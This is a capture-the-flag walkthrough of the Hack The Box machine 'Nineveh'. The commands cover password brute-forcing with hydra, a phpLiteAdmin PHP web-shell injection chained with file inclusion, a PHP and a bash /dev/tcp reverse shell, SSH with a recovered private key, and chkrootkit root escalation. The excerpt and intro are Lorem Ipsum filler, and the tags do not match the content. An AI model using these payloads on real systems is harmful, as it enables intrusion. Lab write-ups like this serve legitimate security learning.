---
layout: single
title: Nineveh - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2021-02-21
classes: wide
header:
  teaser: /assets/images/htb-writeup-nineveh/nineveh_logo.png
  teaser_home_page: true
  icon: /assets/images/htb.png
categories:
  - hackthebox
  - infosec
tags:  
  - osticket
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-nineveh/nineveh_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------


   ██╗   ██╗███████╗███████╗██████╗
   ██║   ██║██╔════╝██╔════╝██╔══██╗
   ██║   ██║███████╗█████╗  ██████╔╝
   ██║   ██║╚════██║██╔══╝  ██╔══██╗
   ╚██████╔╝███████║███████╗██║  ██║
    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝

1. [root:/git/htb/nineveh]# nmap -Pn -n -sCV 10.10.10.43 --open                                                                     (master✱)
  PORT    STATE SERVICE  VERSION
  80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
  |_http-server-header: Apache/2.4.18 (Ubuntu)
  |_http-title: Site doesn't have a title (text/html).
  443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
  |_http-server-header: Apache/2.4.18 (Ubuntu)
  |_http-title: Site doesn't have a title (text/html).
  | ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR
  | Not valid before: 2017-07-01T15:03:30
  |_Not valid after:  2018-07-01T15:03:30
  |_ssl-date: TLS randomness does not represent time
  | tls-alpn:
  |_  http/1.1


  DIRB (port 80):
  + http://10.10.10.43/index.html (CODE:200|SIZE:178)
  + http://10.10.10.43/info.php (CODE:200|SIZE:83767)
  + http://10.10.10.43/server-status (CODE:403|SIZE:299)

  DIRB (port 443):
  ==> DIRECTORY: https://10.10.10.43/db/
  + https://10.10.10.43/index.html (CODE:200|SIZE:49)
  + https://10.10.10.43/server-status (CODE:403|SIZE:300)

  NIKTO (port80):
  + Allowed HTTP Methods: OPTIONS, GET, HEAD, POST


2. Port 80 is just a default, empty, page. While on port 443 we find an image. Download the image and run 'binwalk' to see if there's
   anything hidden inside it.

    [root:/git/htb/nineveh]# binwalk ninevehForAll.png                                                                                (master✱)

      DECIMAL       HEXADECIMAL     DESCRIPTION
      --------------------------------------------------------------------------------
      0             0x0             PNG image, 1336 x 508, 8-bit/color RGB, non-interlaced
      84            0x54            Zlib compressed data, best compression

    [root:...ninevehForAll.png.extracted]# ls -al                                                                                   (master✱)
      total 556
      drwxr-xr-x 2 root root   4096 Feb 25 14:00 .
      drwxr-xr-x 3 root root   4096 Feb 25 14:00 ..
      -rw-r--r-- 1 root root      0 Feb 25 14:00 54
      -rw-r--r-- 1 root root 560768 Feb 25 14:00 54.zlib

    [root:...ninevehForAll.png.extracted]# file -b 54.zlib                                                                          (master✱)
      zlib compressed data

  Not sure if this file is a rabbit hole or not, but I am unable to extract anything from it.

  https://10.10.10.43/db/index.php is a login page to phpLiteAdmin v1.9, however we don't have any creds to login.
  The login doesn't seem vulnerable to SQLi either, so lets skip this one for now.

  Go back to square one and start to fuzz port 80 with a bigger wordlist and we find http://10.10.10.43/department/

    root@nidus:/git/htb/nineveh# ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://10.10.10.43/FUZZ
      --- snip ---
      department              [Status: 301, Size: 315, Words: 20, Lines: 10]


3. We find a new login page http://10.10.10.43/department/login.php.
 In the source code we find a comment '@admin! MySQL is been installed.. please fix the login page! ~amrois'

 Trying /department/login.php for sql auth bypass fails. But we have a user, amrois, so we can try to password spray the login.
 Running hydra with user 'amrois' give a lot of false possitives, making us unable to brute the password.
 Hydra on user 'admin' however works!

  [root:/git/htb/nineveh]# hydra -l admin -P /usr/share/wordlists/rockyou.txt -vV -f 10.10.10.43 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid Password"
    --- snip ---
    [ATTEMPT] target 10.10.10.43 - login "admin" - pass "gerson" - 4575 of 14344399 [child 3] (0/0)
    [80][http-post-form] host: 10.10.10.43   login: admin   password: 1q2w3e4r5t

 WE GOT CREDS! admin:1q2w3e4r5t on http://10.10.10.43/department/login.php


4. Looking around on the page, we find 'Notes' saying:
  > Have you fixed the login page yet! hardcoded username and password is really bad idea!
  > check your serect folder to get in! figure it out! this is your challenge
  > Improve the db interface.
  >~amrois

  * Binwalk:ing the image gives nothing.
  * The note-page looks like it would be prone to LFI, however I can't find anything.

  The note says something about hardcoded creds, lets try to brute force https://10.10.10.43/db/index.php as well.

  [root:/git/htb/nineveh]# hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 -vV -f https-post-form '/db/index.php:password=^PASS^&remember=yes&logn=Log+In&proc_login=true:Incorrect password'
    --- snip ---
    [ATTEMPT] target 10.10.10.43 - login "admin" - pass "harry" - 1404 of 14344399 [child 7] (0/0)
    [443][http-post-form] host: 10.10.10.43   login: admin   password: password123

  Another set of working creds! admin:password123 on https://10.10.10.43/db/index.php


5. Search for known phpLiteAdmin v1.9 vulns.

[root:...ninevehForAll.png.extracted]# searchsploit phpliteadmin                                                                (master✱)
  --------------------------------------------------------------------------------------------------------- ---------------------------------
   Exploit Title                                                                                           |  Path
  --------------------------------------------------------------------------------------------------------- ---------------------------------
  PHPLiteAdmin 1.9.3 - Remote PHP Code Injection                                                           | php/webapps/24044.txt


  a) Create a new database named 'ninevehNotes.php'
  b) Create a new table, Name: "test", Number of Fields: "1"
  c) In field write: '<?php echo system($_REQUEST["cmd"]);?>', and change Type from 'INTEGER' to 'TEXT'
  d) If everything is correct, you should now have RCE through the LFI: http://10.10.10.43/department/manage.php?notes=/var/tmp/ninevehNotes.php&cmd=ls


6. Through the RCE, setup a php reverse shell - remember you need to url encode it first.

  URL: http://10.10.10.43/department/manage.php?notes=/var/tmp/ninevehNotes.php&cmd=php%20-r%20%27%24sock%3Dfsockopen%28%2210.10.14.10%22%2C4488%29%3Bexec%28%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27
  [root:/git/htb/nineveh]# nc -lvnp 4488                                                                                           (master✱)
    listening on [any] 4488 ...
    connect to [10.10.14.10] from (UNKNOWN) [10.10.10.43] 59940
    /bin/sh: 0: can't access tty; job control turned off
    $ whoami
      www-data


7. Enumerate the box and we find a file with a curious filename 'ninevehdestruction.jpg', located in /var/www/html

Transfer the .jpg to local Kali box to investigate with Binwalk.
  [root:/git/htb/nineveh]# nc -lp 4400 > ninevehdestruction.jpg
  www-data@nineveh:/var/www/html$ nc -w 3 10.10.14.10 4400 < ninevehdestruction.jpg

  [root:/git/htb/nineveh]# binwalk ninevehdestruction.jpg                                                                         (master✱)

    DECIMAL       HEXADECIMAL     DESCRIPTION
    --------------------------------------------------------------------------------
    0             0x0             JPEG image data, EXIF standard
    12            0xC             TIFF image data, little-endian offset of first image directory: 8


  There's nothing we can extract. Continue with the enum and we find '/var/www/ssl/secure_notes' and within 'nineveh.png',
  maybe this png will hold some information! Transfer it and look with binwalk.

  [root:/git/htb/nineveh]# binwalk nineveh.png                                                                                    (master✱)

    DECIMAL       HEXADECIMAL     DESCRIPTION
    --------------------------------------------------------------------------------
    0             0x0             PNG image, 1497 x 746, 8-bit/color RGB, non-interlaced
    84            0x54            Zlib compressed data, best compression
    2881744       0x2BF8D0        POSIX tar archive (GNU)

 Extract the data (binwalk -e) and pray for loot!

 [root:/git/htb/nineveh]# binwalk -e nineveh.png
 [root:/git/htb/nineveh]# ls -alR _nineveh.png.extracted                                                                         (master✱)
   _nineveh.png.extracted:
     total 2852
     drwxr-xr-x 3 root     root        4096 Feb 25 16:54 .
     drwxr-xr-x 4 root     root        4096 Feb 25 16:54 ..
     -rw-r--r-- 1 root     root       10240 Feb 25 16:54 2BF8D0.tar
     -rw-r--r-- 1 root     root           0 Feb 25 16:54 54
     -rw-r--r-- 1 root     root     2891900 Feb 25 16:54 54.zlib
     drwxr-xr-x 2 www-data www-data    4096 Jul  2  2017 secret

   _nineveh.png.extracted/secret:
     total 16
     drwxr-xr-x 2 www-data www-data 4096 Jul  2  2017 .
     drwxr-xr-x 3 root     root     4096 Feb 25 16:54 ..
     -rw------- 1 www-data www-data 1675 Jul  2  2017 nineveh.priv
     -rw-r--r-- 1 www-data www-data  400 Jul  2  2017 nineveh.pub


  We got a private key, however SSH is not open. Maybe this is a rabbit hole, I'll dig deeper in the box with linpeas.


8. Using linpeas we can see that SSH-files exists, and port 22 is listening locally.

    [+] Looking for ssl/ssh files
      /home/amrois/.ssh/authorized_keys   /usr/lib/initramfs-tools/etc/dhcp/dhclient-enter-hooks.d/config
      Port 22
      PubkeyAuthentication yes
      PermitEmptyPasswords no
      ChallengeResponseAuthentication no
      PasswordAuthentication no
      UsePAM yes
        --> Some certificates were found (out limited):
      /etc/apache2/ssl/nineveh/nineveh.crt

       --> /etc/hosts.allow file found, read the rules:

    [+] Active Ports
      Active Internet connections (servers and established)
      Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
      tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -


  Transfer the private key to the victim machine, and ssh internally.

    www-data@nineveh:/dev/shm$ ssh amrois@127.0.0.1 -i nineveh.priv
    amrois@nineveh:~$ whoami
      amrois
    amrois@nineveh:~$ cat user.txt
      82b21cf2928d940081bf79b85edcc26c


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██████╗  ██████╗  ██████╗ ████████╗
   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
   ██████╔╝██║   ██║██║   ██║   ██║
   ██╔══██╗██║   ██║██║   ██║   ██║
   ██║  ██║╚██████╔╝╚██████╔╝   ██║
   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝


1. Running linpeas.sh we can see that the PATH is changed, where /home/amrois is at the beginning.

  [+] PATH
  /home/amrois/bin:/home/amrois/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
  New path exported: /home/amrois/bin:/home/amrois/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

  And a cron job running a script.

    [+] Cron jobs
    # m h  dom mon dow   command
    */10 * * * * /usr/sbin/report-reset.sh

  amrois@nineveh:/dev/shm$ cat /usr/sbin/report-reset.sh
    cat /usr/sbin/report-reset.sh
    #!/bin/bash

    rm -rf /report/*.txt

  Guessing from that script, something should be writing reports to /report on a regular basis. Upload pspy64 to see what service
  and if we can exploit it.

  2021/02/25 10:57:03 CMD: UID=0    PID=863    | /bin/sh /usr/bin/chkrootkit
  2021/02/25 10:57:03 CMD: UID=0    PID=862    | /bin/sh /usr/bin/chkrootkit
  2021/02/25 10:57:03 CMD: UID=0    PID=867    | /bin/sh /usr/bin/chkrootkit
  2021/02/25 10:57:03 CMD: UID=0    PID=866    | /bin/sh /usr/bin/chkrootkit


2. Reading more about chkrootkit we find a major vulnerability - it there is a executable file named 'update' in /tmp/ chkrootkit
   will execute it, as root. Since the cron job automatically triggers chkrootkit, this will be our path to root.

   Create a reverse shell named 'update' in /tmp/, give it execute privs and with for incomming root shell.

   amrois@nineveh:/tmp$ cat update
    #!/bin/bash
    bash -i >& /dev/tcp/10.10.14.10/4444 0>&1

   amrois@nineveh:/tmp$ chmod +x update

   [root:~]# nc -lvnp 4444
     listening on [any] 4444 ...
     connect to [10.10.14.10] from (UNKNOWN) [10.10.10.43] 40310
     bash: cannot set terminal process group (20042): Inappropriate ioctl for device
     bash: no job control in this shell
     root@nineveh:~# whoami
      root
     root@nineveh:~# cat /root/root.txt
       f1b9f3a15a4cf8f89d9285e948b66432



██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
   ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║
   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
   ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
   ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝

PHPLiteAdmin 1.9 RCE:
  https://www.exploit-db.com/exploits/24044
  https://v3ded.github.io/ctf/zico2

Chkrootkit privesc:
  https://www.exploit-db.com/exploits/33899
